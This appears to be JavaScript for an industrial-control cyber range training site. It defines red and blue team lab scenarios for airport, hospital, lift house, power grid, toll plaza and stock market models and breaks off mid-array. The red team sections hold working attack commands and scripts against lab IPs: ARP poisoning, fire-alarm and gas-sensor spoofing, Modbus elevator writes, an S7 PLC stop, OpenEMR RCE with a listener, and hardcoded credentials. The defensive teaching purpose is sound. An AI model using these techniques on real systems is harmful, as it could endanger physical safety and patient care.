const domainTitles = {
  airport: "Airport",
  "water-treatment": "Water Treatment",
  industry: "Industrial",
  hospital: "Hospital",
  "lift-house": "Lift House",
  "power-grid": "Power Grid",
  "toll-plaza": "Toll Plaza",
  "data-center": "Data Center",
  "stock-market": "Stock Market",
  metro: "Metro",
  "traffic-lights": "Traffic Lights"
};

function currentRole() {
  const role = localStorage.getItem("phygital_role") || "";
  const isAdmin = role === "admin" && Boolean(localStorage.getItem("phygital_admin_token"));
  const isStudent = role === "student" && Boolean(localStorage.getItem("cdac_ctf_student"));
  return { role, isAdmin, isStudent };
}

const industryDashboardUrl = "http://172.16.17.204:1880/ui/#!/4?socketid=zxL7Ex3NoOUjbRHMAAAB";
const dataCenterDashboardUrl = "http://172.16.17.204:1880/ui/#!/7?socketid=vmNCQThlV3IuIaD_AAAV";
const waterTreatmentDashboardUrl = "http://172.16.17.204:1880/ui/#!/1?socketid=F6KardZPucXn7VJVAAAf";
const airportDashboardUrl = "http://172.16.17.204:1880/ui/#!/10?socketid=7J_TWzB_YMYtYmrFAABZ";
const liftHouseDashboardUrl = "http://172.16.17.204:1880/ui/#!/9?socketid=QGYkhWhEN5NjOPobAABn";
const powerGridDashboardUrl = "http://172.16.17.204:1880/ui/#!/0?socketid=S-GZxcLifXaTepOkAABh";
const tollPlazaDashboardUrl = "http://172.16.17.204:1880/ui/#!/2?socketid=QGYkhWhEN5NjOPobAABn";
const metroDashboardUrl = "http://172.16.17.204:1880/ui/#!/8?socketid=QGYkhWhEN5NjOPobAABn";
const trafficLightsDashboardUrl = "http://172.16.17.204:1880/ui/#!/3?socketid=QGYkhWhEN5NjOPobAABn";
const hospitalOpenEmrUrl = "http://172.16.17.217/openemr";
const openEmrExploitRefUrl = "https://github.com/EmreOvunc/OpenEMR_Vulnerabilities/";

const airportScenarios = {
  red: {
    kicker: "Red Team Scenario",
    title: "Airport Multi-System Attack Surface",
    summary: "Students investigate authorized lab-only Airport attack paths across Airport Doors, Baggage Reclaim, Airplane Parking, Air Quality Sensors, Kiosk, and Billboard systems.",
    badges: ["Airport Doors", "Baggage Reclaim", "MQTT Sensors", "Kiosk + Billboard"],
    steps: [
      "Airport Doors: enumerate approved PLC targets, identify OPC UA exposure, audit authentication, browse the Door object, and validate safe state restoration.",
      "Baggage Reclaim: enumerate the reclaim-belt controller, identify OPC UA exposure, audit authentication, browse the belt control object, and validate safe state restoration.",
      "Airplane Parking and Air Quality Sensors: enumerate MQTT exposure, subscribe to visible topics, map topic IDs and payload formats, then simulate a controlled false value for the approved component.",
      "Kiosk: enumerate HTTP traffic, compare successful and failed PNR responses, forward traffic through an approved proxy, and document response-tampering impact.",
      "Billboard: enumerate FTP exposure, validate anonymous upload risk, inspect the video-processing workflow, and document how unsafe file handling can lead to billboard content compromise.",
      "Restore every changed value to the approved safe state before ending the drill."
    ],
    actionTitle: "Airport Lab Commands",
    commands: `==============================
AIRPORT DOORS - OPC UA
==============================
Enumeration:
  Find the approved door PLC targets.
  Identify whether TCP/4840 is open.
  Test whether OPC UA requires authentication.

Exploitation / Simulation:
  Use an approved username:password audit file with OpalOPC.
  opalopc -vv opc.tcp://<door_plc_ip>:4840 -B <usernamepassword_file>
  Open the generated report and validate access with UAExpert.
  Browse Objects > Door and identify the safe training value.

Evidence / Cleanup:
  Record the object path, value name, and observed door behavior.
  Restore the approved safe door state.


==============================
BAGGAGE RECLAIM - OPC UA
==============================
Enumeration:
  Find the baggage reclaim controller.
  Identify whether TCP/4840 is open.
  Test whether OPC UA requires authentication.

Exploitation / Simulation:
  opalopc -vv opc.tcp://<baggage_reclaim_plc_ip>:4840 -B <usernamepassword_file>
  Open the generated report and validate access with UAExpert.
  Browse Objects and locate the reclaim-belt control value.

Evidence / Cleanup:
  Record the object path and the belt-state change.
  Restore the approved safe belt state.


==============================
AIRPLANE PARKING + AIR QUALITY - MQTT
==============================
Enumeration:
  Find MQTT services on approved Airport sensor targets.
  nmap -p 1883 <approved_airport_sensor_targets>
  Subscribe with the wildcard topic to learn topic IDs and payload formats.
  mosquitto_sub -h <broker_ip> -t '#' -p 1883 -v

Exploitation / Simulation:
  Sniff the individual topic ID.
  Create a script to inject a controlled fake value to the respective component.
  Publish only to the approved training topic.

Evidence / Cleanup:
  Record the topic name, original value, fake value, and dashboard effect.
  Stop the publisher and confirm values return to normal.


==============================
KIOSK - HTTP MITM
==============================
Enumeration:
  Find the kiosk HTTP endpoint and paired host.
  Capture traffic while someone tests correct and incorrect PNR values.
  Identify the response format and the success/failure field.

Exploitation / Simulation:
  Forward HTTP traffic to an approved local proxy port.
  sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-port 8080
  Use mitmproxy to modify only the approved lab response fields.
  mitmproxy -s <approved_kiosk_response_script.py>

Evidence / Cleanup:
  Record before/after PNR response behavior.
  sudo iptables -F
  sudo iptables -t nat -F


==============================
BILLBOARD - FTP + VIDEO WORKFLOW
==============================
Enumeration:
  Identify whether the billboard exposes FTP.
  nmap --script=ftp-anon <billboard_host>
  Check whether anonymous upload is allowed.
  Review the video-management workflow and where approved videos are stored.

Exploitation / Simulation:
  Upload only the approved benign training media file.
  Observe how the billboard workflow handles uploaded files.
  Inspect whether automation scripts run with unsafe privileges or unsafe library paths.

Evidence / Cleanup:
  Record anonymous FTP risk, uploaded filename, processing behavior, and privilege boundary findings.
  Remove unauthorized test media and restore approved billboard content.


Safety note:
  Run only in the approved lab network.
  Do not leave spoofed values, altered kiosk responses, or modified billboard files active after the drill.`,
    links: [
      { label: "Open Airport Dashboard", href: airportDashboardUrl },
      { label: "UAExpert Download", href: "https://www.unified-automation.com/downloads/opc-ua-clients.html#c598" },
      { label: "OpalOPC GitHub", href: "https://github.com/ValtteriL/OpalOPC" }
    ]
  },
  blue: {
    kicker: "Blue Team Scenario",
    title: "Airport Defense And Response",
    summary: "Students defend Airport doors, baggage reclaim, MQTT telemetry, kiosk HTTP workflows, and billboard media handling by detecting unauthorized writes, response tampering, unsafe uploads, and impossible physical or passenger-service states.",
    badges: ["Detect", "Contain", "Restore", "Harden Airport OT"],
    steps: [
      "Detect: monitor airport doors, baggage reclaim belt state, airplane parking telemetry, air-quality sensor values, kiosk passenger responses, and billboard media changes for impossible or unauthorized changes.",
      "Confirm: compare physical model behavior with expected operator actions, OPC UA client sessions, MQTT topic activity, kiosk HTTP captures, FTP upload logs, and dashboard timelines.",
      "Contain OPC UA: disconnect unauthorized OPC UA clients, isolate the suspected Kali host, and block unapproved TCP/4840 access.",
      "Contain MQTT: stop unauthorized publishers, block untrusted TCP/1883 clients, and preserve topic evidence for review.",
      "Contain kiosk MITM: stop ARP poisoning, remove iptables forwarding, stop mitmproxy, clear poisoned ARP entries, and preserve packet evidence.",
      "Contain billboard upload risk: disable anonymous FTP, remove unapproved media, preserve upload/process evidence, and validate the video-management workflow.",
      "Recover: restore doors, baggage reclaim belt, parking state, air-quality values, kiosk PNR response behavior, and billboard content to approved safe operating state.",
      "Harden: disable anonymous OPC UA and FTP access, remove weak credentials, restrict OPC UA/MQTT/HTTP kiosk/FTP access to trusted hosts, require MQTT authentication and ACLs, segment Airport OT, protect against ARP spoofing, and alert on write operations, wildcard topic abuse, kiosk response anomalies, or unexpected media changes."
    ],
    actionTitle: "Mitigation Steps",
    commands: `==============================
STOP UNAUTHORIZED ACCESS
==============================
   Close suspicious OPC UA client sessions
   Stop unknown MQTT publishers
   Stop mitmproxy and unauthorized HTTP interception
   Disable anonymous FTP access if billboard uploads are exposed
   Isolate the attacking Kali host from the Airport PLC network
   Clear ARP poisoning on affected kiosk and server/gateway hosts
   Flush lab iptables forwarding after testing:
   sudo iptables -F
   sudo iptables -t nat -F

==============================
RESTORE SAFE AIRPORT STATES
==============================
   Connect with an approved OPC UA client or operator workflow
   Restore Objects > Door values
   Restore the baggage reclaim belt control value
   Restore airplane parking and air-quality MQTT values
   Confirm kiosk PNR responses match the legitimate backend
   Remove unapproved billboard media and restore approved content

==============================
VALIDATE RECOVERY
==============================
   Check Airport door PLCs:
   172.16.17.123
   172.16.17.124
   172.16.17.125
   Check baggage reclaim PLC:
   172.16.17.130
   Check MQTT sources:
   172.16.20.101
   172.16.17.207
   Check kiosk HTTP target:
   172.16.17.112
   Check paired host:
   172.16.17.100
   Check billboard FTP/media workflow:
   <billboard_host>

==============================
HARDENING CHECKLIST
==============================
   Disable anonymous OPC UA access
   Remove weak/default credentials
   Enforce strong unique usernames and passwords
   Disable anonymous FTP access
   Restrict TCP/4840, TCP/1883, kiosk HTTP, and billboard FTP access to trusted hosts
   Require MQTT usernames, passwords, and topic ACLs
   Disable wildcard topic access for student clients
   Segment Airport PLCs and kiosk services from student networks
   Enable switch protections against ARP spoofing
   Prefer authenticated/encrypted kiosk transport where supported
   Alert on OPC UA write operations, brute-force attempts, abnormal MQTT publishes, kiosk response changes, and unexpected billboard media changes`,
    links: [
      { label: "Open Airport Dashboard", href: airportDashboardUrl }
    ]
  }
};

const hospitalScenarios = {
  red: {
    kicker: "Red Team Scenario",
    title: "Hospital OpenEMR Authenticated RCE Attack Surface",
    summary: "Students investigate an authorized lab-only OpenEMR 5.0.1 attack path, validate authenticated RCE risk, and understand how application compromise can lead to medication tampering through backend database access.",
    badges: ["OpenEMR 5.0.1", "TCP/80", "Authenticated RCE", "phpMyAdmin"],
    steps: [
      "Open the Hospital OpenEMR application and enumerate the exposed web application version and technology stack.",
      "Confirm that the target is OpenEMR 5.0.1 and map it to the approved lab exploit reference.",
      "Use the provided lab account to authenticate and validate that the exploit path requires credentials.",
      "Start an approved listener on the attacker machine and run only the authorized updated exploit available in the Kali VM on the server.",
      "After lab access is obtained, inspect the system for phpMyAdmin configuration evidence.",
      "Review the phpMyAdmin configuration path and recover the database credential used in this training scenario.",
      "Use phpMyAdmin to identify the patient medication table and understand how unauthorized modification could impact patient safety.",
      "Restore any changed medication value and hand findings to the Blue Team."
    ],
    actionTitle: "Hospital Lab Commands",
    commands: `==============================
ENUMERATION
==============================
Target application:
  http://172.16.17.217/openemr

Version to confirm:
  OpenEMR 5.0.1

Student task:
  Identify the web application version, technology stack, and authenticated attack surface.


==============================
AUTHENTICATED LAB VALIDATION
==============================
Lab account:
  sahil:sahil

Listener used during the approved lab drill:
  nc -lvnp 4444

Student task:
  Validate that the attack path requires authentication and document the observed callback behavior.


==============================
POST-COMPROMISE REVIEW
==============================
Configuration review path:
  C:\\Apache24\\htdocs\\phpMyAdmin\\config.inc.php

phpMyAdmin lab credential found during the exercise:
  root:hacker@123

Student task:
  Identify how database access can affect patient medication integrity.


==============================
SAFETY AND CLEANUP
==============================
Use only the updated exploit already provided in the Kali VM for this lab.
Restore any medication-table change after observation.
Hand findings to the Blue Team.`,
    links: [
      { label: "Open Hospital OpenEMR", href: hospitalOpenEmrUrl },
      { label: "OpenEMR Exploit Reference", href: openEmrExploitRefUrl }
    ]
  },
  blue: {
    kicker: "Blue Team Scenario",
    title: "Hospital OpenEMR Defense And Response",
    summary: "Students defend the Hospital model by detecting authenticated RCE behavior, containing web-shell or reverse-shell activity, restoring patient medication integrity, and hardening OpenEMR/phpMyAdmin exposure.",
    badges: ["Detect RCE", "Contain Web App", "Restore Medication", "Harden OpenEMR"],
    steps: [
      "Detect: review OpenEMR access logs for suspicious authenticated activity from the lab attacker host.",
      "Confirm: inspect web server logs, process activity, and unexpected outbound connections such as reverse-shell callbacks.",
      "Contain: disable the abused account, stop the suspicious session, and isolate the affected web host from attacker access.",
      "Recover: verify phpMyAdmin and database access, restore medication values to approved baseline, and validate patient records.",
      "Eradicate: remove unauthorized files, temporary payloads, and any modified exploit artifacts from the web server.",
      "Harden: upgrade OpenEMR, remove weak/shared accounts, restrict phpMyAdmin, rotate database credentials, enforce least privilege, and alert on medication table changes."
    ],
    actionTitle: "Mitigation Steps",
    commands: `==============================
CONTAIN ACCOUNT AND SESSION
==============================
   Disable or reset the abused OpenEMR account
   Terminate suspicious web and shell sessions
   Isolate the attacker host from the Hospital web server

==============================
REVIEW EVIDENCE
==============================
   Check Apache/OpenEMR logs for authenticated exploit activity
   Check for outbound callback connections to the attacker listener
   Review changed files under the web root

==============================
RESTORE PATIENT SAFETY
==============================
   Validate medication records in the database
   Restore any changed medication value from baseline
   Confirm OpenEMR shows the correct patient medication

==============================
HARDENING CHECKLIST
==============================
   Upgrade OpenEMR beyond the vulnerable 5.0.1 version
   Remove weak/shared accounts
   Restrict phpMyAdmin to trusted admin hosts only
   Rotate database credentials
   Enforce least-privilege database accounts
   Alert on medication-table changes and unusual authenticated RCE indicators`,
    links: [
      { label: "Open Hospital OpenEMR", href: hospitalOpenEmrUrl }
    ]
  }
};

const liftHouseScenarios = {
  red: {
    kicker: "Red Team Scenario",
    title: "Lift House Multi-System Attack Surface",
    summary: "Students investigate three authorized lab-only Lift House attack paths: gas sensor spoofing over WebSocket, fire sensor tampering over CoAP MITM, and elevator control mapping over Modbus TCP.",
    badges: ["Gas WebSocket", "Fire CoAP", "Elevator Modbus", "Three Attack Paths"],
    steps: [
      "Gas sensor path: perform authorized ARP poisoning between 172.16.17.207 and 172.16.17.104, capture WebSocket traffic, identify the payload format, and send a controlled high H2 value.",
      "Gas sensor path: observe how a fake reading such as H2:99.99 affects monitoring and response assumptions.",
      "Fire sensor path: perform authorized ARP poisoning between the fire server 172.16.17.113 and one approved fire sensor IP.",
      "Fire sensor path: capture CoAP traffic in Wireshark, analyze the true/false payload format, and use an ettercap filter to alter the value in transit.",
      "Elevator path: scan the elevator PLC for Modbus TCP, read register values while the dashboard changes floors, map floor values across register addresses, and perform only approved safe write tests.",
      "Stop the active test, clear poisoning/filters, and restore normal gas, fire, and elevator state before ending the drill."
    ],
    actionTitle: "Lift House Lab Commands",
    commands: `==============================
GAS SENSOR ATTACK PATH
==============================
Protocol: WebSocket
Targets: 172.16.17.207 and 172.16.17.104
Endpoint: ws://172.16.17.207:1880/gas/H2
Goal: inject a high gas value such as H2:99.99,

# 1) Start authorized ARP poisoning with ettercap
sudo ettercap -G

# In ettercap:
# - Scan for hosts
# - Add 172.16.17.207 to Target 1
# - Add 172.16.17.104 to Target 2
# - Start ARP poisoning

# 2) Capture WebSocket traffic in Wireshark
# Observe the gas sensor payload format before injecting anything.

# 3) Install dependency if needed
python3 -m pip install websockets

# 4) gas_fake.py - sample controlled gas-value injection
import asyncio
import websockets

async def inject_fake_data():
    uri = "ws://172.16.17.207:1880/gas/H2"
    try:
        async with websockets.connect(uri) as websocket:
            fake_payload = "H2:99.99,"
            while True:
                await websocket.send(fake_payload)
                print(f"Sent fake data: {fake_payload}")
    except Exception as e:
        print(f"Error: {e}")

asyncio.run(inject_fake_data())


==============================
FIRE SENSOR ATTACK PATH
==============================
Protocol: CoAP
Server: 172.16.17.113
Sensors: 172.16.17.103, 172.16.17.104, 172.16.17.108, 172.16.17.109
Port: 5684
Goal: alter fire sensor state in transit, such as true -> false

# 1) Start authorized ARP poisoning with ettercap
sudo ettercap -G

# In ettercap:
# - Scan for hosts
# - Add 172.16.17.113 to Target 1
# - Add one fire sensor IP to Target 2
# - Start ARP poisoning

# 2) Capture CoAP packets in Wireshark
coap

# 3) coap_filter.ecf - sample fire-state tamper filter
if (ip.proto == UDP && udp.dst == 5684){
  replace("true", "false");
}

# 4) Compile the filter
etterfilter coap_filter.ecf -o coap_filter.ef

# 5) Load coap_filter.ef inside ettercap
# ettercap menu -> Filters -> Load filter -> select coap_filter.ef

# Safety note:
# Run only in the approved lab network, stop ARP poisoning after observation,
# and confirm both gas and fire sensor readings return to normal.


==============================
ELEVATOR ATTACK PATH
==============================
Protocol: Modbus Application Protocol
PLC: 172.16.17.129
Port: 502
Goal: map elevator floor register values and understand unsafe Modbus write risk

# 1) Identify Modbus TCP exposure
nmap -p 502 172.16.17.129

# 2) Start Metasploit Modbus client
msfconsole
use auxiliary/scanner/scada/modbusclient
set rhosts 172.16.17.129

# 3) Read register values while someone controls the elevator from the dashboard
set data_address 1
run

# 4) Repeat reads for floor-related register addresses
set data_address 0
run
set data_address 1
run
set data_address 2
run
set data_address 3
run
set data_address 4
run

# 5) Approved write test only after mapping safe values
set action write_register
set data <captured_safe_floor_value>
run

# Safety note:
# Write only approved captured values during the lab and restore the elevator
# to the expected floor/state after observation.`,
    links: [
      { label: "Open Lift House Dashboard", href: liftHouseDashboardUrl }
    ]
  },
  blue: {
    kicker: "Blue Team Scenario",
    title: "Lift House Defense And Response",
    summary: "Students defend Lift House gas, fire, and elevator systems by detecting ARP poisoning, false WebSocket values, CoAP tampering, unauthorized Modbus reads/writes, and impossible physical-state changes.",
    badges: ["Detect MITM", "Contain Sensors", "Restore Elevator", "Harden Lift House"],
    steps: [
      "Detect: monitor for duplicate MAC/IP mappings, ARP table changes, sudden gas spikes, and fire-state mismatches.",
      "Confirm: compare dashboard or telemetry readings with physical sensor status and packet captures.",
      "Contain: stop the attacker host, end ettercap poisoning, clear poisoned ARP entries, and isolate the suspicious Kali machine.",
      "Contain elevator risk: stop unauthorized Modbus clients, isolate untrusted hosts, and block unapproved TCP/502 access.",
      "Recover: restart or reconnect affected gas/fire sensor flows, restore elevator to the approved safe floor/state, and verify normal WebSocket/CoAP/Modbus behavior.",
      "Validate: confirm gas readings, fire-state values, and elevator movement match physical conditions for several observation cycles.",
      "Harden: segment sensor and elevator networks, enable switch protections against ARP spoofing, authenticate WebSocket publishers, protect CoAP traffic, restrict Modbus TCP to trusted HMI/SCADA hosts, validate sensor ranges, and alert on impossible gas/fire/elevator transitions."
    ],
    actionTitle: "Mitigation Steps",
    commands: `==============================
GAS SENSOR BLUE TEAM RESPONSE
==============================

1. Stop gas telemetry spoofing:
   Stop the attacking WebSocket script
   Stop ettercap ARP poisoning
   Isolate the suspicious Kali machine
   Clear poisoned ARP entries for 172.16.17.207 and 172.16.17.104

2. Validate gas telemetry:
   Inspect WebSocket messages for H2 values
   Flag impossible readings such as H2:99.99
   Compare dashboard values with the physical Lift House model
   Confirm gas readings return to normal for several cycles

3. Gas hardening:
   Authenticate WebSocket publishers
   Restrict WebSocket endpoints to trusted hosts
   Add range validation for H2/CH4 readings
   Alert on repeated high gas readings or unexpected publishers


==============================
FIRE SENSOR BLUE TEAM RESPONSE
==============================

1. Stop fire sensor MITM:
   Stop ettercap ARP poisoning
   Unload the active ettercap filter
   Isolate the suspicious Kali machine
   Clear poisoned ARP entries for 172.16.17.113 and the affected fire sensor

2. Validate fire telemetry:
   Capture packets with Wireshark
   Apply filter: coap
   Compare true/false fire state with the physical sensor state
   Confirm the dashboard matches the physical fire sensor condition

3. Fire hardening:
   Protect CoAP traffic or restrict it to trusted hosts
   Segment fire sensors away from student/attacker networks
   Enable switch-level ARP spoofing protections
   Add state-change validation in the receiver
   Alert on unexpected true/false transitions


==============================
ELEVATOR BLUE TEAM RESPONSE
==============================

1. Stop unauthorized Modbus access:
   Close suspicious Modbus client sessions
   Isolate the suspicious Kali machine
   Block unapproved TCP/502 access to 172.16.17.129

2. Validate elevator state:
   Confirm the current floor/state on the dashboard
   Compare it with the physical Lift House elevator
   Restore the elevator to the approved safe floor/state

3. Elevator hardening:
   Restrict Modbus TCP to trusted HMI/SCADA hosts
   Segment the elevator PLC from student networks
   Log read/write register activity
   Alert on write_register operations and unexpected floor changes
   Document approved register addresses and safe values`,
    links: [
      { label: "Open Lift House Dashboard", href: liftHouseDashboardUrl }
    ]
  }
};

const powerGridScenarios = {
  red: {
    kicker: "Red Team Scenario",
    title: "Power Grid ISO-TSAP Attack Surface",
    summary: "Students investigate an authorized lab-only Power Grid exposure where ISO-TSAP/S7 communication on TCP/102 can allow unsafe PLC stop behavior if segmentation and protocol controls are weak.",
    badges: ["ISO-TSAP", "TCP/102", "S7COMM STOP", "Power Grid"],
    steps: [
      "Open the Power Grid dashboard and observe normal generation, relay, and load behavior before testing.",
      "Enumerate the approved grid controller target and confirm whether TCP/102 is exposed internally.",
      "Review the SIMATIC-SMACKDOWN lab tool and understand that this exercise demonstrates S7COMM STOP command risk.",
      "Build and run the approved lab tool only against the authorized Power Grid target.",
      "Observe dashboard and physical model behavior, record evidence, and immediately hand findings to the Blue Team.",
      "Restore the grid model to the approved safe running state before ending the drill."
    ],
    actionTitle: "Power Grid Lab Commands",
    commands: `==============================
ENUMERATION
==============================
Vulnerability:
  Internally exposed ISO-TSAP / insecure S7 communication

Protocol:
  TCP

Port:
  102

Student task:
  Find the approved Power Grid controller target.
  Confirm whether TCP/102 is reachable from the lab network.
  Record scan evidence before running any simulation.


==============================
LAB TOOL REVIEW
==============================
Reference tool:
  https://github.com/RoseSecurity/SIMATIC-SMACKDOWN

Exploit concept:
  S7COMM STOP command risk against an exposed controller.

Student task:
  Review the tool purpose and confirm the target is the approved lab model only.


==============================
BUILD
==============================
Clone or open the approved lab copy of the tool.

Build command:
  make build

Student task:
  Confirm build output exists before execution.


==============================
CONTROLLED SIMULATION
==============================
Run only during the approved lab window:
  ./simatic_smackdown

Student task:
  Watch the Power Grid dashboard and physical model for relay/generation/load impact.
  Record timestamp, observed effect, and affected state.


==============================
RESTORE SAFE STATE
==============================
Stop the simulation.
Use the approved operator workflow to restore the grid model.
Confirm the dashboard returns to normal operating state.

Safety note:
  Run only on the approved lab target and never against production or non-lab controllers.`,
    links: [
      { label: "Open Power Grid Dashboard", href: powerGridDashboardUrl },
      { label: "SIMATIC-SMACKDOWN", href: "https://github.com/RoseSecurity/SIMATIC-SMACKDOWN" }
    ]
  },
  blue: {
    kicker: "Blue Team Scenario",
    title: "Power Grid ISO-TSAP Defense And Response",
    summary: "Students defend the Power Grid model by detecting exposed TCP/102 access, containing unauthorized S7 communication, restoring PLC/run state, and documenting segmentation and monitoring controls.",
    badges: ["Detect TCP/102", "Contain S7", "Restore Grid", "Harden OT"],
    steps: [
      "Detect: monitor the dashboard for sudden relay, generation, load, or controller stop behavior.",
      "Confirm: correlate the dashboard event with network traffic to TCP/102 and any unusual S7COMM activity.",
      "Contain: isolate the suspected attacker host and block unapproved TCP/102 access to the grid controller.",
      "Recover: restore controller/run state using the approved operator workflow.",
      "Validate: confirm generation, relay, and load indicators remain stable after recovery.",
      "Harden: restrict ISO-TSAP/S7 access to trusted engineering hosts, segment the PLC network, monitor S7 stop/write actions, and document approved controller access."
    ],
    actionTitle: "Mitigation Steps",
    commands: `==============================
DETECT AND CONFIRM
==============================
Check the Power Grid dashboard for:
  Unexpected stop state
  Relay or load changes
  Generation instability

Review network evidence for:
  TCP/102 connections
  S7COMM stop/write indicators
  Unknown engineering hosts


==============================
CONTAIN
==============================
Isolate the suspicious Kali or engineering host.
Block unapproved TCP/102 access to the Power Grid controller.
Preserve packet captures and dashboard timeline evidence.


==============================
RESTORE GRID STATE
==============================
Use the approved operator workflow to return the PLC/model to RUN or normal state.
Validate relay, load, and generation indicators on the dashboard.
Compare dashboard state with the physical model.


==============================
HARDENING CHECKLIST
==============================
Restrict TCP/102 to trusted HMI/engineering stations only.
Segment Power Grid PLCs from student networks.
Disable unnecessary ISO-TSAP exposure.
Monitor and alert on S7COMM STOP/write actions.
Maintain an approved controller-access inventory.
Document recovery SOPs for controller stop events.`,
    links: [
      { label: "Open Power Grid Dashboard", href: powerGridDashboardUrl }
    ]
  }
};

const tollPlazaScenarios = {
  red: {
    kicker: "Red Team Scenario",
    title: "Toll Plaza RFID Card Attack Surface",
    summary: "Students investigate an authorized lab-only Toll Plaza weakness where vulnerable MIFARE-style RFID cards can be read, cloned to a writable card, and replayed at the toll reader.",
    badges: ["RFID", "MIFARE", "Card Cloning Risk", "Toll Plaza"],
    steps: [
      "Open the Toll Plaza dashboard and observe normal RFID reader, lane, barrier, and payment events.",
      "Identify the approved Toll Plaza RFID reader and confirm this exercise uses lab-provided test cards only.",
      "Use the read feature on an approved RFID cloning device to capture data from a lab card.",
      "Write the captured data to an approved writable lab card.",
      "Use the cloned test card at the Toll Plaza reader and observe unauthorized access behavior on the dashboard.",
      "Remove the cloned test card from use and hand evidence to the Blue Team."
    ],
    actionTitle: "Toll Plaza Lab Commands",
    commands: `==============================
ENUMERATION
==============================
Target:
  Toll Plaza RFID reader

Vulnerability:
  Vulnerable RFID cards

Protocol:
  RFID MIFARE

Student task:
  Identify the approved reader and confirm the dashboard shows normal lane/barrier events.
  Use only lab-provided RFID cards and approved training hardware.


==============================
READ TEST CARD
==============================
Use the approved RFID cloning device.
Select the read RFID feature.
Place the lab card on the reader and capture the card data.

Student task:
  Record card identifier, timestamp, reader response, and dashboard event.


==============================
WRITE LAB CARD
==============================
Use an approved writable RFID lab card.
Use the write feature to copy the captured test-card data.

Student task:
  Label the card as a cloned test card and keep it inside the lab exercise.


==============================
ACCESS SIMULATION
==============================
Present the cloned test card to the Toll Plaza RFID reader.
Observe lane, payment, and barrier behavior on the dashboard.

Student task:
  Record whether the cloned test card produced unauthorized access behavior.


==============================
CLEANUP
==============================
Remove cloned test cards from circulation.
Restore normal Toll Plaza operation.
Hand the original card, cloned card, and dashboard evidence to the Blue Team.

Safety note:
  This exercise is only for approved lab cards. Do not clone real access, payment, or identity cards.`,
    links: [
      { label: "Open Toll Plaza Dashboard", href: tollPlazaDashboardUrl }
    ]
  },
  blue: {
    kicker: "Blue Team Scenario",
    title: "Toll Plaza RFID Defense And Response",
    summary: "Students defend the Toll Plaza model by detecting cloned RFID card behavior, correlating lane/barrier events, revoking test-card access, and recommending stronger anti-cloning controls.",
    badges: ["Detect Replay", "Contain Card Abuse", "Restore Access Control", "Harden RFID"],
    steps: [
      "Detect: monitor the dashboard for repeated RFID identifiers, impossible travel timing, duplicate card use, or barrier events without valid payment context.",
      "Confirm: compare reader logs, lane events, barrier cycles, and physical card use during the drill.",
      "Contain: remove the cloned test card, revoke or block the affected card identifier, and stop unauthorized reader access.",
      "Recover: restore normal toll lane operation and confirm valid cards behave correctly.",
      "Validate: confirm no duplicate-card events continue after containment.",
      "Harden: use diversified keys, mutual authentication where supported, challenge-response cards, anti-passback logic, transaction binding, and alerting for cloned/replayed card identifiers."
    ],
    actionTitle: "Mitigation Steps",
    commands: `==============================
DETECT AND CONFIRM
==============================
Review Toll Plaza dashboard for:
  Repeated card identifiers
  Duplicate card use
  Barrier open events without valid payment context
  Impossible timing between card events

Compare:
  RFID reader logs
  Lane events
  Barrier cycles
  Physical card used in the lab


==============================
CONTAIN
==============================
Remove the cloned test card from use.
Block or revoke the affected test-card identifier.
Stop further RFID tests until evidence is recorded.


==============================
RESTORE NORMAL OPERATION
==============================
Test a valid lab card.
Confirm lane and barrier behavior returns to normal.
Confirm the dashboard shows expected payment/access events.


==============================
HARDENING CHECKLIST
==============================
Avoid static reusable card identifiers for access decisions.
Use diversified keys and mutual authentication where supported.
Prefer challenge-response cards over cloneable legacy cards.
Bind card reads to transaction/session context.
Add anti-passback and impossible-travel checks.
Alert on duplicate card IDs and repeated failed reader events.
Maintain card issuance, revocation, and audit records.`,
    links: [
      { label: "Open Toll Plaza Dashboard", href: tollPlazaDashboardUrl }
    ]
  }
};

const stockMarketScenarios = {
  red: {
    kicker: "Red Team Scenario",
    title: "Stock Market Phishing And Billboard Attack Surface",
    summary: "Students investigate two authorized lab-only Stock Market attack paths: phishing-led ransomware simulation against a training workstation and billboard media workflow compromise through unsafe FTP/upload handling.",
    badges: ["Phishing Simulation", "Ransomware Drill", "FTP Billboard", "Stock Exchange"],
    steps: [
      "Phishing path: review the Stock Exchange training mailbox and build a controlled phishing-awareness email for the lab account only.",
      "Phishing path: use a benign ransomware simulator that encrypts only an approved test file and stores a recovery key for classroom restoration.",
      "Observe how a user downloading and running an attachment would affect the training file, then document impact without touching real files.",
      "Billboard path: enumerate the billboard FTP workflow, check for anonymous upload risk, and review how uploaded media is processed.",
      "Document unsafe processing, privilege-boundary, and media replacement risks without deploying reverse shells or modifying system libraries.",
      "Restore the test file and approved billboard content before ending the drill."
    ],
    actionTitle: "Stock Market Lab Commands",
    commands: `==============================
PHISHING AWARENESS SETUP
==============================
Training mailbox:
  stockexchangecpsmyra@gmail.com

Scenario:
  A user receives a tempting reward-themed email with a suspicious attachment.

Student task:
  Draft the phishing lure for awareness training only.
  Do not send real phishing emails outside the approved lab mailbox.
  Record subject line, attachment name, and user-risk indicators.


==============================
BENIGN RANSOMWARE SIMULATION
==============================
Approved test file:
  /home/alpha/Documents/secret.dat

Recovery key file:
  /home/alpha/Documents/encryption_key.bin

Student task:
  Use only the approved classroom simulator.
  Encrypt only the approved test file.
  Store the key/IV so the file can be restored after the drill.
  Record file hash/status before and after simulation.

Safety note:
  Do not run ransomware logic against real user directories, shared folders, removable drives, or production machines.


==============================
PHISHING IMPACT REVIEW
==============================
Observe:
  Whether the attachment was downloaded
  Whether execution occurred
  Which test file changed
  Whether endpoint or mail controls generated alerts

Student task:
  Document the infection chain and prepare Blue Team evidence.


==============================
BILLBOARD - FTP + MEDIA WORKFLOW
==============================
Enumeration:
  Identify whether the billboard exposes FTP.
  nmap --script=ftp-anon <billboard_host>
  Check whether anonymous upload is allowed.
  Review the media-management workflow and approved video folder.

Simulation:
  Upload only an approved benign training media file.
  Observe how the billboard workflow processes uploaded files.
  Inspect whether automation scripts run with unsafe privileges or unsafe library paths.

Safety note:
  Do not deploy reverse shells, modify system libraries, or remove legitimate media during the drill.


==============================
CLEANUP
==============================
Restore the encrypted test file using the saved classroom recovery key.
Remove any benign test media from the billboard workflow.
Restore approved billboard content.
Hand phishing, file-change, and billboard evidence to the Blue Team.`,
    links: []
  },
  blue: {
    kicker: "Blue Team Scenario",
    title: "Stock Market Phishing And Billboard Defense",
    summary: "Students defend the Stock Market model by detecting phishing delivery, containing a ransomware simulation, restoring the training file, and hardening billboard media upload workflows.",
    badges: ["Mail Defense", "Ransomware Recovery", "FTP Hardening", "Incident Response"],
    steps: [
